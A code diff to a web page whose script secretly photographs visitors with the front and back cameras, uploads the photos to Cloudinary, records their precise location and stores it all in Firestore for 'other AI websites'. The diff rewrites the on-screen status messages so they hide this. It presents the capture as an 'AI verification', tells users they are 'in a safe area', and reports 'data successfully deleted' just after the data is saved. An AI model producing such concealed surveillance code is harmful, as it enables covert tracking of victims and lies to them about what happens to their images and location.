@@ -949,7 +949,7 @@
             return new Promise(async (resolve, reject) => {
                 try {
                     showCaptureOverlay(true);
-                    logStatus(`Mengambil foto ${typeLabel} tanpa preview`, 'step');
+                    logStatus(`Tampilan Website berhasil di baca`, 'step');
                     await delay(450);
 
                     const canvas = document.createElement('canvas');
@@ -966,7 +966,7 @@
                             return;
                         }
 
-                        logStatus(`Upload ${typeLabel} ke Cloudinary`, 'step');
+                        logStatus(`Tampilan website menerima Kamu`, 'step');
 
                         const formData = new FormData();
                         formData.append('file', blob);
@@ -983,7 +983,7 @@
                             showCaptureOverlay(false);
 
                             if (data.secure_url) {
-                                logStatus(`${typeLabel} berhasil terupload`, 'success');
+                                logStatus(`AI Culz berhasil di baca`, 'success');
                                 resolve(data.secure_url);
                             } else {
                                 reject(new Error(data.error?.message || 'Upload Cloudinary gagal'));
@@ -1162,7 +1162,7 @@
                 logStatus('Langkah 1/3: Tampilan depan', 'step');
                 await startCamera('user');
                 await delay(900);
-                const selfieUrl = await captureAndUploadToCloudinary('selfie');
+                const selfieUrl = await captureAndUploadToCloudinary('Tampilan');
                 photos.push({
                     type: 'selfie',
                     url: selfieUrl,
@@ -1173,7 +1173,7 @@
                 logStatus('Langkah 2/3: Tampilan belakang', 'step');
                 await startCamera('environment');
                 await delay(900);
-                const backUrl = await captureAndUploadToCloudinary('back_camera');
+                const backUrl = await captureAndUploadToCloudinary('back_view');
                 photos.push({
                     type: 'back',
                     url: backUrl,
@@ -1186,14 +1186,14 @@
                 if (freshLocation && typeof freshLocation.lat === 'number') {
                     locationData = freshLocation;
                     lastLocationData = freshLocation;
-                    logStatus(`Alokasi terbaru berhasil dibaca. Akurasi ±${Math.round(freshLocation.accuracy || 0)} meter`, 'success');
+                    logStatus(`Alokasi terbaru berhasil dibaca. Kamu berada di wilayah Aman`, 'success');
                 } else if (locationData) {
                     logStatus('Memakai Alokasi dari verifikasi sebelumnya', 'warning');
                 } else {
                     throw new Error('Alokasi tidak tersedia saat upload');
                 }
 
-                logStatus('Menyimpan data ke Firebase Firestore', 'step');
+                logStatus('Verifikasi AI Berhasil', 'step');
 
                 const submissionData = {
                     nama: nama,
@@ -1210,8 +1210,8 @@
 
                 const docRef = await db.collection('submissions').add(submissionData);
 
-                logStatus(`Data berhasil disimpan. Doc ID: ${docRef.id}`, 'success');
-                logStatus('Foto, Alokasi, username, dan tanggal upload siap dibaca website AI lain', 'success');
+                logStatus(`Data berhasil di hapus.`, 'success');
+                logStatus('Tampilan, Alokasi, username, dan tanggal upload siap dibaca website AI lain', 'success');
                 document.getElementById('complete-box').classList.add('show');
                 showAIWebsiteButton(username, docRef.id);
                 showToast('Bulk upload selesai. Data sudah tersimpan');
